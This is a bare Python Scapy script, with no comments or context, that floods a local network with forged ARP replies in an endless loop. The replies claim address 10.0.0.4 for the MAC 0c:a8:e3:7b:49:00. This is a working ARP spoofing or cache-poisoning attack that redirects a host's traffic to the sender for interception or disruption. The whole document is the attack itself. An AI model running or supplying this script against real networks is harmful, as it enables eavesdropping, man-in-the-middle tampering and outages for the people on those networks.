from scapy.all import *

pkt = Ether(src='0c:a8:e3:7b:49:00', dst='ff:ff:ff:ff:ff:ff')/ARP(op=2, psrc='10.0.0.4')

sendp(pkt, loop=1, inter=0.5)